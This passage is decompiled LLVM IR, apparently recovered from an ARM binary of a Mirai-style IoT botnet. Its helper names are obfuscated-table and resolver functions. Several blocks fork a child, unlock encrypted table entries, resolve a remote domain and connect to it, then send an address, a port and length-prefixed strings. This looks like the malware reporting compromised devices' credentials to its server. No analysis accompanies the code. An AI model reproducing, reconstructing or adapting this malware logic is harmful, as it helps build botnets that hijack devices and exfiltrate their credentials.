  %v1_11560 = add i32 %v2_11558, 13
  %v2_11560 = inttoptr i32 %v1_11560 to i8*
  %v3_11560 = load i8, i8* %v2_11560, align 1
  %v4_11560 = zext i8 %v3_11560 to i32
  store i32 %v4_11560, i32* %r2.global-to-local, align 4
  %v1_11564 = add i32 %v2_11558, 4
  %v2_11564 = inttoptr i32 %v1_11564 to i32*
  %v3_11564 = load i32, i32* %v2_11564, align 4
  store i32 %v3_11564, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1156c = call i32 @__libc_send(i32 %v3_1155c, i32 %v3_11564, i32 %v4_11560, i32 16384)
  store i32 %v4_1156c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11574 = load i32, i32* @r6, align 4
  %v1_11574 = add i32 %v0_11574, 4
  %v2_11574 = inttoptr i32 %v1_11574 to i32*
  %v3_11574 = load i32, i32* %v2_11574, align 4
  store i32 %v3_11574, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11580 = call i32 @__libc_send(i32 %v3_11574, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2, i32 16384)
  store i32 %v4_11580, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_11588 = load i32, i32* @r6, align 4
  %v2_11588 = add i32 %v1_11588, 12
  %v3_11588 = inttoptr i32 %v2_11588 to i32*
  store i32 5, i32* %v3_11588, align 4
  br label %dec_label_pc_11334

dec_label_pc_11590:                               ; preds = %dec_label_pc_10cb0
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_1159c = call i32 @table_unlock_val(i32 25)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_115ac = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_115ac, i32* %r0.global-to-local, align 4
  %v3_115b0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_115ac, i32* %r2.global-to-local, align 4
  %v1_115b8 = add i32 %v3_115b0, -1
  store i32 %v1_115b8, i32* %r3.global-to-local, align 4
  %v0_115bc = load i32, i32* @r6, align 4
  %v1_115bc = add i32 %v0_115bc, 24
  %v2_115bc = inttoptr i32 %v1_115bc to i32*
  %v3_115bc = load i32, i32* %v2_115bc, align 4
  store i32 %v3_115bc, i32* %r1.global-to-local, align 4
  %v0_115c0 = load i32, i32* @fp, align 4
  store i32 %v0_115c0, i32* %r0.global-to-local, align 4
  %v4_115c4 = call i32 @util_memsearch(i32 %v0_115c0, i32 %v3_115bc, i32 %v3_115ac, i32 %v1_115b8)
  store i32 %v4_115c4, i32* @r8, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_115d0 = call i32 @table_lock_val(i32 25)
  store i32 %v1_115d0, i32* %r0.global-to-local, align 4
  %v0_115d4 = load i32, i32* @r8, align 4
  %v2_115d4 = icmp eq i32 %v0_115d4, -1
  store i1 %v2_115d4, i1* %cpsr_c.global-to-local, align 1
  %v7_115d4 = icmp eq i32 %v0_115d4, -1
  store i1 %v7_115d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115d4, label %dec_label_pc_10b88.loopexit, label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %dec_label_pc_11590
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_115dc = icmp eq i32 %v0_115d4, 0
  store i1 %v2_115dc, i1* %cpsr_z.global-to-local, align 1
  %tmp413 = icmp slt i32 %v0_115d4, 1
  br i1 %tmp413, label %dec_label_pc_11334, label %dec_label_pc_115e4

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115dc
  %v0_115e4 = load i32, i32* @r6, align 4
  %v1_115e4 = add i32 %v0_115e4, 20
  %v2_115e4 = inttoptr i32 %v1_115e4 to i16*
  %v3_115e4 = load i16, i16* %v2_115e4, align 2
  %v4_115e4 = zext i16 %v3_115e4 to i32
  store i32 %v4_115e4, i32* %r3.global-to-local, align 4
  %v1_115e8 = add i32 %v0_115e4, 16
  %v2_115e8 = inttoptr i32 %v1_115e8 to i32*
  %v3_115e8 = load i32, i32* %v2_115e8, align 4
  store i32 %v3_115e8, i32* %r2.global-to-local, align 4
  store i32 %v2_115ec, i32* @lr, align 4
  store i32 %v4_115e4, i32* %stack_var_-42, align 4
  store i32 %v3_115e8, i32* %stack_var_-60, align 4
  %v1_115f8 = inttoptr i32 %v0_115e4 to i32*
  %v2_115f8 = load i32, i32* %v1_115f8, align 4
  store i32 %v2_115f8, i32* @sb, align 4
  %v0_115fc = call i32 @__libc_fork()
  store i32 %v0_115fc, i32* %r0.global-to-local, align 4
  %v7_11600 = icmp eq i32 %v0_115fc, -1
  %.424 = zext i1 %v7_11600 to i32
  store i32 %.424, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1160c = icmp eq i32 %v0_115fc, 0
  store i1 %v2_1160c, i1* %cpsr_z.global-to-local, align 1
  %tmp416 = icmp slt i32 %v0_115fc, 1
  br i1 %tmp416, label %bb417, label %.thread117

.thread117:                                       ; preds = %dec_label_pc_115e4
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11664

bb417:                                            ; preds = %dec_label_pc_115e4
  store i32 %.424, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11618 = icmp eq i1 %v7_11600, false
  store i1 %v2_11618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11618, label %dec_label_pc_11620, label %dec_label_pc_11664

dec_label_pc_11620:                               ; preds = %bb417
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1162c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1162c, i32* %r0.global-to-local, align 4
  %v2_11630 = icmp eq i32 %v3_1162c, -1
  store i1 %v2_11630, i1* %cpsr_c.global-to-local, align 1
  %v7_11630 = icmp eq i32 %v3_1162c, -1
  store i1 %v7_11630, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1162c, i32* @r7, align 4
  br i1 %v7_11630, label %dec_label_pc_118dc, label %dec_label_pc_1163c

dec_label_pc_1163c:                               ; preds = %dec_label_pc_11620
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_11640 = call i32 @table_unlock_val(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_11648 = call i32 @table_unlock_val(i32 19)
  %v0_1164c = load i32, i32* @sl, align 4
  store i32 %v0_1164c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_11654 = inttoptr i32 %v0_1164c to i32*
  %v3_11654 = call i32 @table_retrieve_val(i32 18, i32* %v2_11654)
  store i32 %v3_11654, i32* %r0.global-to-local, align 4
  %v1_11658 = call i32 @resolv_lookup(i32 %v3_11654)
  store i32 %v1_11658, i32* %r0.global-to-local, align 4
  store i32 %v1_11658, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1165c = icmp eq i32 %v1_11658, 0
  store i1 %v3_1165c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1165c, label %dec_label_pc_11664, label %dec_label_pc_117bc

dec_label_pc_11664:                               ; preds = %.thread117, %dec_label_pc_1163c, %bb417
  %v0_11664 = load i32, i32* @r6, align 4
  %v1_11664 = add i32 %v0_11664, 4
  %v2_11664 = inttoptr i32 %v1_11664 to i32*
  %v3_11664 = load i32, i32* %v2_11664, align 4
  store i32 %v3_11664, i32* %r0.global-to-local, align 4
  %v1_11668 = call i32 @__GI___libc_close(i32 %v3_11664)
  store i32 %v1_11668, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_11674 = load i32, i32* @r6, align 4
  %v2_11674 = add i32 %v1_11674, 4
  %v3_11674 = inttoptr i32 %v2_11674 to i32*
  store i32 -1, i32* %v3_11674, align 4
  %v0_11678 = load i32, i32* %r2.global-to-local, align 4
  %v1_11678 = load i32, i32* @r6, align 4
  %v2_11678 = add i32 %v1_11678, 12
  %v3_11678 = inttoptr i32 %v2_11678 to i32*
  store i32 %v0_11678, i32* %v3_11678, align 4
  br label %dec_label_pc_11334

dec_label_pc_11680:                               ; preds = %dec_label_pc_10b94
  store i32 %.pre, i32* @r0, align 4
  %v1_11688 = add i32 %v0_11680, 156
  store i32 %v1_11688, i32* @r1, align 4
  store i32 384, i32* @r2, align 4
  %v3_11690 = call i32 @memmove(i32 %.pre, i32 %v1_11688, i32 384)
  store i32 %v3_11690, i32* %r0.global-to-local, align 4
  %v0_11694 = load i32, i32* @r6, align 4
  %v1_11694 = add i32 %v0_11694, 24
  %v2_11694 = inttoptr i32 %v1_11694 to i32*
  %v3_11694 = load i32, i32* %v2_11694, align 4
  %v1_11698 = add i32 %v3_11694, -128
  store i32 %v1_11698, i32* %r3.global-to-local, align 4
  store i32 %v1_11698, i32* %v2_11694, align 4
  br label %dec_label_pc_10ba4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_114e8
  store i32 %v2_114a8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_116b0 = add i32 %v0_114d4, 4
  %v2_116b0 = inttoptr i32 %v1_116b0 to i32*
  %v3_116b0 = load i32, i32* %v2_116b0, align 4
  store i32 %v3_116b0, i32* %r0.global-to-local, align 4
  %v4_116b4 = call i32 @__libc_send(i32 %v3_116b0, i32 %v2_114a8, i32 3, i32 16384)
  store i32 %v4_116b4, i32* %r0.global-to-local, align 4
  %v0_116b8 = load i32, i32* @r6, align 4
  %v1_116b8 = add i32 %v0_116b8, 4
  %v2_116b8 = inttoptr i32 %v1_116b8 to i32*
  %v3_116b8 = load i32, i32* %v2_116b8, align 4
  store i32 %v3_116b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11478

dec_label_pc_116c8:                               ; preds = %dec_label_pc_10ce8
  %v0_116c8 = load i32, i32* @r6, align 4
  store i32 %v0_116c8, i32* @r0, align 4
  %v0_116cc = call i32 @setup_connection()
  store i32 %v0_116cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d24

dec_label_pc_116d4:                               ; preds = %dec_label_pc_10b4c
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_11844, i32* %r3.global-to-local, align 4
  store i32 %v2_1124c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_116fc = call i32 @getsockopt(i32 %v3_10b40, i32 1, i32 4, i32 %v2_11844, i32 %v2_1124c)
  %v3_11700 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11700, i32* %r3.global-to-local, align 4
  %v2_11704 = or i32 %v3_11700, %v5_116fc
  store i32 %v2_11704, i32* %r0.global-to-local, align 4
  %v4_11704 = icmp eq i32 %v2_11704, 0
  store i1 %v4_11704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_11704, label %dec_label_pc_1170c, label %dec_label_pc_117a0

dec_label_pc_1170c:                               ; preds = %dec_label_pc_116d4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_11710 = load i32, i32* @r6, align 4
  %v2_11710 = add i32 %v1_11710, 12
  %v3_11710 = inttoptr i32 %v2_11710 to i32*
  store i32 2, i32* %v3_11710, align 4
  %v0_11714 = call i32 @rand_next()
  %v2_1171c = load i16, i16* bitcast (i16** @global_var_24384.192 to i16*), align 4
  %v3_1171c = zext i16 %v2_1171c to i32
  %v2_11720 = udiv i32 %v0_11714, %v3_1171c
  %v3_11720 = urem i32 %v0_11714, %v3_1171c
  store i32 %v2_11720, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24354.188 to i32), i32* %r3.global-to-local, align 4
  %v2_11728 = load i32, i32* @global_var_24354.188, align 4
  store i32 %v2_11728, i32* %ip.global-to-local, align 4
  %v1_11730 = load i32, i32* @r4, align 4
  %v9_11730 = icmp eq i32 %v2_11728, %v1_11730
  store i1 %v9_11730, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_11720, i32* %r1.global-to-local, align 4
  %v7_11738 = icmp sgt i32 %v2_11728, %v1_11730
  br i1 %v7_11738, label %dec_label_pc_1173c, label %dec_label_pc_1177c

dec_label_pc_1173c:                               ; preds = %dec_label_pc_1170c
  %v2_11740 = load i32, i32* @global_var_24380.190, align 4
  store i32 %v2_11740, i32* %r3.global-to-local, align 4
  store i32 %v1_11730, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1175c

dec_label_pc_1174c:                               ; preds = %dec_label_pc_1176c, %dec_label_pc_1175c
  %v1_1174c = add i32 %v0_1174c, 1
  store i32 %v1_1174c, i32* %r2.global-to-local, align 4
  %v9_11750 = icmp eq i32 %v1_1174c, %v2_11728
  %v1_11754 = add i32 %v0_11754, 16
  store i32 %v1_11754, i32* %r3.global-to-local, align 4
  br i1 %v9_11750, label %dec_label_pc_1177c.loopexit, label %dec_label_pc_1175c

dec_label_pc_1175c:                               ; preds = %dec_label_pc_1174c, %dec_label_pc_1173c
  %v0_1174c = phi i32 [ %v1_1174c, %dec_label_pc_1174c ], [ %v1_11730, %dec_label_pc_1173c ]
  %v0_11754 = phi i32 [ %v1_11754, %dec_label_pc_1174c ], [ %v2_11740, %dec_label_pc_1173c ]
  store i32 %v0_11754, i32* %r0.global-to-local, align 4
  %v1_11760 = add i32 %v0_11754, 8
  %v2_11760 = inttoptr i32 %v1_11760 to i16*
  %v3_11760 = load i16, i16* %v2_11760, align 2
  %v4_11760 = zext i16 %v3_11760 to i32
  store i32 %v4_11760, i32* %r3.global-to-local, align 4
  %tmp418 = icmp ugt i32 %v4_11760, %v3_11720
  br i1 %tmp418, label %dec_label_pc_1174c, label %dec_label_pc_1176c

dec_label_pc_1176c:                               ; preds = %dec_label_pc_1175c
  %v1_1176c = add i32 %v0_11754, 10
  %v2_1176c = inttoptr i32 %v1_1176c to i16*
  %v3_1176c = load i16, i16* %v2_1176c, align 2
  %v4_1176c = zext i16 %v3_1176c to i32
  store i32 %v4_1176c, i32* %r3.global-to-local, align 4
  %v3_11770 = icmp uge i32 %v4_1176c, %v3_11720
  %v9_11770 = icmp eq i32 %v4_1176c, %v3_11720
  %v2_11774 = xor i1 %v3_11770, true
  %v3_11774 = or i1 %v9_11770, %v2_11774
  br i1 %v3_11774, label %dec_label_pc_1174c, label %dec_label_pc_11780.loopexit

dec_label_pc_1177c.loopexit:                      ; preds = %dec_label_pc_1174c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1177c

dec_label_pc_1177c:                               ; preds = %dec_label_pc_1177c.loopexit, %dec_label_pc_1170c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11780

dec_label_pc_11780.loopexit:                      ; preds = %dec_label_pc_1176c
  store i1 %v3_11770, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11780

dec_label_pc_11780:                               ; preds = %dec_label_pc_11780.loopexit, %dec_label_pc_1177c
  %v0_11794 = phi i32 [ %v0_11754, %dec_label_pc_11780.loopexit ], [ 0, %dec_label_pc_1177c ]
  %v0_11780 = load i32, i32* @r6, align 4
  %v1_11780 = add i32 %v0_11780, 4
  %v2_11780 = inttoptr i32 %v1_11780 to i32*
  %v3_11780 = load i32, i32* %v2_11780, align 4
  %v3_11784 = udiv i32 %v3_11780, 32
  store i32 %v3_11784, i32* %r2.global-to-local, align 4
  %v1_11788 = urem i32 %v3_11780, 32
  store i32 %v1_11788, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1178c = mul nuw nsw i32 %v3_11784, 4
  store i32 %v3_1178c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11794 = inttoptr i32 %v0_11780 to i32*
  store i32 %v0_11794, i32* %v2_11794, align 4
  %v0_11798 = load i32, i32* %r3.global-to-local, align 4
  %v1_11798 = load i32, i32* @r6, align 4
  %v2_11798 = add i32 %v1_11798, 24
  %v3_11798 = inttoptr i32 %v2_11798 to i32*
  store i32 %v0_11798, i32* %v3_11798, align 4
  %v0_10b74.pre = load i32, i32* @ip, align 4
  %v1_10b7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10b70

dec_label_pc_117a0:                               ; preds = %dec_label_pc_116d4
  %v0_117a0 = load i32, i32* @r6, align 4
  %v1_117a0 = add i32 %v0_117a0, 4
  %v2_117a0 = inttoptr i32 %v1_117a0 to i32*
  %v3_117a0 = load i32, i32* %v2_117a0, align 4
  store i32 %v3_117a0, i32* %r0.global-to-local, align 4
  %v1_117a4 = call i32 @__GI___libc_close(i32 %v3_117a0)
  store i32 %v1_117a4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_117ac = load i32, i32* @r4, align 4
  %v1_117ac = load i32, i32* @r6, align 4
  %v2_117ac = add i32 %v1_117ac, 12
  %v3_117ac = inttoptr i32 %v2_117ac to i32*
  store i32 %v0_117ac, i32* %v3_117ac, align 4
  %v0_117b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_117b0 = load i32, i32* @r6, align 4
  %v2_117b0 = add i32 %v1_117b0, 4
  %v3_117b0 = inttoptr i32 %v2_117b0 to i32*
  store i32 %v0_117b0, i32* %v3_117b0, align 4
  %v0_117b4 = load i32, i32* @r4, align 4
  %v1_117b4 = trunc i32 %v0_117b4 to i8
  %v2_117b4 = load i32, i32* @r6, align 4
  %v3_117b4 = add i32 %v2_117b4, 540
  %v4_117b4 = inttoptr i32 %v3_117b4 to i8*
  store i8 %v1_117b4, i8* %v4_117b4, align 1
  br label %dec_label_pc_10c98

dec_label_pc_117bc:                               ; preds = %dec_label_pc_1163c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v2_115ec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_117c8 = add i32 %v1_11658, 4
  %v2_117c8 = inttoptr i32 %v1_117c8 to i32*
  %v3_117c8 = load i32, i32* %v2_117c8, align 4
  store i32 %v3_117c8, i32* @r4, align 4
  %v0_117cc = call i32 @rand_next()
  store i32 %v0_117cc, i32* %r0.global-to-local, align 4
  %v0_117d0 = load i32, i32* @r5, align 4
  %v1_117d0 = inttoptr i32 %v0_117d0 to i8*
  %v2_117d0 = load i8, i8* %v1_117d0, align 1
  %v3_117d0 = zext i8 %v2_117d0 to i32
  %v2_117d4 = udiv i32 %v0_117cc, %v3_117d0
  %v3_117d4 = urem i32 %v0_117cc, %v3_117d0
  store i32 %v2_117d4, i32* %r0.global-to-local, align 4
  store i32 %v3_117d4, i32* %r1.global-to-local, align 4
  %v0_117d8 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_117d8 = mul nuw nsw i32 %v3_117d4, 4
  %v5_117d8 = add i32 %v0_117d8, %v4_117d8
  %v6_117d8 = inttoptr i32 %v5_117d8 to i32*
  %v7_117d8 = load i32, i32* %v6_117d8, align 4
  store i32 %v7_117d8, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v0_117e0 = load i32, i32* @sl, align 4
  store i32 %v0_117e0, i32* %r1.global-to-local, align 4
  %v2_117e8 = inttoptr i32 %v0_117e0 to i32*
  %v3_117e8 = call i32 @table_retrieve_val(i32 19, i32* %v2_117e8)
  store i32 %v2_115ec, i32* %r2.global-to-local, align 4
  %v0_117f8 = load i32, i32* @r5, align 4
  store i32 %v0_117f8, i32* %r0.global-to-local, align 4
  %v1_117fc = call i32 @resolv_entries_free(i32 %v0_117f8)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_11804 = call i32 @table_lock_val(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_1180c = call i32 @table_lock_val(i32 19)
  %v0_11814 = load i32, i32* @r7, align 4
  store i32 %v0_11814, i32* %r0.global-to-local, align 4
  store i32 %v2_11818, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11820 = call i32 @__libc_connect(i32 %v0_11814, i32 %v2_11818, i32 16)
  store i32 %v3_11820, i32* %r0.global-to-local, align 4
  %v3_11824 = icmp eq i32 %v3_11820, -1
  store i1 %v3_11824, i1* %cpsr_c.global-to-local, align 1
  %v8_11824 = icmp eq i32 %v3_11820, -1
  store i1 %v8_11824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11824, label %dec_label_pc_1182c, label %dec_label_pc_1183c

dec_label_pc_1182c:                               ; preds = %dec_label_pc_117bc
  %v0_1182c = load i32, i32* @r7, align 4
  store i32 %v0_1182c, i32* %r0.global-to-local, align 4
  %v1_11830 = call i32 @__GI___libc_close(i32 %v0_1182c)
  %v0_11834 = load i32, i32* @sl, align 4
  store i32 %v0_11834, i32* %r0.global-to-local, align 4
  %v1_11838 = call i32 @__GI_exit(i32 %v0_11834)
  store i32 %v1_11838, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1183c

dec_label_pc_1183c:                               ; preds = %dec_label_pc_117bc, %dec_label_pc_1182c
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11844, i32* %r1.global-to-local, align 4
  %v0_11848 = load i32, i32* @r7, align 4
  store i32 %v0_11848, i32* %r0.global-to-local, align 4
  %v0_1184c = load i32, i32* @sl, align 4
  store i32 %v0_1184c, i32* %stack_var_-56, align 4
  %v5_11850 = call i32 @__libc_send(i32 %v0_11848, i32 %v2_11844, i32 1, i32 16384)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11864 = load i32, i32* @r7, align 4
  store i32 %v0_11864, i32* %r0.global-to-local, align 4
  %v4_11868 = call i32 @__libc_send(i32 %v0_11864, i32 %v2_1124c, i32 4, i32 16384)
  store i32 %v2_11870, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1187c = load i32, i32* @r7, align 4
  store i32 %v0_1187c, i32* %r0.global-to-local, align 4
  %v4_11880 = call i32 @__libc_send(i32 %v0_1187c, i32 %v2_11870, i32 2, i32 16384)
  %v0_11884 = load i32, i32* @sb, align 4
  %v1_11884 = add i32 %v0_11884, 12
  store i32 %v1_11884, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11890 = load i32, i32* @r7, align 4
  store i32 %v0_11890, i32* %r0.global-to-local, align 4
  %v4_11894 = call i32 @__libc_send(i32 %v0_11890, i32 %v1_11884, i32 1, i32 16384)
  store i32 %v4_11894, i32* %r0.global-to-local, align 4
  %v0_11898 = load i32, i32* @sb, align 4
  %v1_11898 = inttoptr i32 %v0_11898 to i32*
  %v2_11898 = load i32, i32* %v1_11898, align 4
  store i32 %v2_11898, i32* %r1.global-to-local, align 4
  %v1_1189c = add i32 %v0_11898, 12
  %v2_1189c = inttoptr i32 %v1_1189c to i8*
  %v3_1189c = load i8, i8* %v2_1189c, align 1
  %v4_1189c = zext i8 %v3_1189c to i32
  store i32 %v4_1189c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_118a4 = load i32, i32* @r7, align 4
  store i32 %v0_118a4, i32* %r0.global-to-local, align 4
  %v4_118a8 = call i32 @__libc_send(i32 %v0_118a4, i32 %v2_11898, i32 %v4_1189c, i32 16384)
  %v0_118ac = load i32, i32* @sb, align 4
  %v1_118ac = add i32 %v0_118ac, 13
  store i32 %v1_118ac, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_118b8 = load i32, i32* @r7, align 4
  store i32 %v0_118b8, i32* %r0.global-to-local, align 4
  %v4_118bc = call i32 @__libc_send(i32 %v0_118b8, i32 %v1_118ac, i32 1, i32 16384)
  %v0_118c0 = load i32, i32* @r7, align 4
  store i32 %v0_118c0, i32* %r0.global-to-local, align 4
  %v0_118c4 = load i32, i32* @sb, align 4
  %v1_118c4 = add i32 %v0_118c4, 13
  %v2_118c4 = inttoptr i32 %v1_118c4 to i8*
  %v3_118c4 = load i8, i8* %v2_118c4, align 1
  %v4_118c4 = zext i8 %v3_118c4 to i32
  store i32 %v4_118c4, i32* %r2.global-to-local, align 4
  %v1_118c8 = add i32 %v0_118c4, 4
  %v2_118c8 = inttoptr i32 %v1_118c8 to i32*
  %v3_118c8 = load i32, i32* %v2_118c8, align 4
  store i32 %v3_118c8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_118d0 = call i32 @__libc_send(i32 %v0_118c0, i32 %v3_118c8, i32 %v4_118c4, i32 16384)
  %v0_118d4 = load i32, i32* @r7, align 4
  store i32 %v0_118d4, i32* %r0.global-to-local, align 4
  %v1_118d8 = call i32 @__GI___libc_close(i32 %v0_118d4)
  store i32 %v1_118d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %dec_label_pc_11620, %dec_label_pc_1183c
  %v0_118dc = load i32, i32* @sl, align 4
  store i32 %v0_118dc, i32* %r0.global-to-local, align 4
  %v1_118e0 = call i32 @__GI_exit(i32 %v0_118dc)
  store i32 %v1_118e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_11310, %dec_label_pc_118dc
  %v0_118e4 = load i32, i32* @fp, align 4
  store i32 %v0_118e4, i32* %r0.global-to-local, align 4
  %v0_118e8 = load i32, i32* @r6, align 4
  %v1_118e8 = add i32 %v0_118e8, 24
  %v2_118e8 = inttoptr i32 %v1_118e8 to i32*
  %v3_118e8 = load i32, i32* %v2_118e8, align 4
  store i32 %v3_118e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b678.343 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_118f4 = call i32 @util_memsearch(i32 %v0_118e4, i32 %v3_118e8, i32 ptrtoint ([6 x i8]* @global_var_1b678.343 to i32), i32 5)
  store i32 %v5_118f4, i32* %r0.global-to-local, align 4
  %v3_118f8 = icmp eq i32 %v5_118f4, -1
  store i1 %v3_118f8, i1* %cpsr_c.global-to-local, align 1
  %v8_118f8 = icmp eq i32 %v5_118f4, -1
  store i1 %v8_118f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_118f4, i32* @r8, align 4
  br i1 %v3_118f8, label %dec_label_pc_10b88.loopexit, label %dec_label_pc_1132c

dec_label_pc_11908:                               ; preds = %dec_label_pc_109e4
  store i32 %v3_11908, i32* %r0.global-to-local, align 4
  %v3_1190c = udiv i32 %v3_11908, 32
  %v3_11910 = mul nuw nsw i32 %v3_1190c, 4
  store i32 %v2_11914, i32* @lr, align 4
  %v2_11918 = add i32 %v3_11910, %v2_11914
  store i32 %v2_11918, i32* %r3.global-to-local, align 4
  %v1_1191c = add i32 %v2_11918, -312
  %v2_1191c = inttoptr i32 %v1_1191c to i32*
  %v3_1191c = load i32, i32* %v2_1191c, align 4
  %v1_11920 = urem i32 %v3_11908, 32
  store i32 %v1_11920, i32* %r1.global-to-local, align 4
  %v7_11924 = shl i32 1, %v1_11920
  %v8_11924 = or i32 %v3_1191c, %v7_11924
  store i32 %v8_11924, i32* %r2.global-to-local, align 4
  %v0_11928 = load i32, i32* @r5, align 4
  %v3_11928 = icmp uge i32 %v0_11928, %v3_11908
  store i1 %v3_11928, i1* %cpsr_c.global-to-local, align 1
  %v9_11928 = icmp eq i32 %v0_11928, %v3_11908
  store i1 %v9_11928, i1* %cpsr_z.global-to-local, align 1
  %v5_1192c = icmp slt i32 %v0_11928, %v3_11908
  br i1 %v5_1192c, label %bb419, label %bb420

bb419:                                            ; preds = %dec_label_pc_11908
  store i32 %v3_11908, i32* @r5, align 4
  br label %bb420

bb420:                                            ; preds = %dec_label_pc_11908, %bb419
  store i32 %v8_11924, i32* %v2_1191c, align 4
  br label %bb371

dec_label_pc_11938:                               ; preds = %dec_label_pc_10c44
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_10bac, align 4
  br label %dec_label_pc_10c60

; uselistorder directives
  uselistorder i32 %v0_11928, { 0, 2, 1 }
  uselistorder i32 %v1_11920, { 1, 0 }
  uselistorder i32 %v5_118f4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_117d0, { 1, 0 }
  uselistorder i32 %v0_117cc, { 1, 0, 2 }
  uselistorder i32 %v3_11780, { 1, 0 }
  uselistorder i1 %v3_11770, { 1, 0 }
  uselistorder i32 %v0_11754, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_11720, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1171c, { 1, 0 }
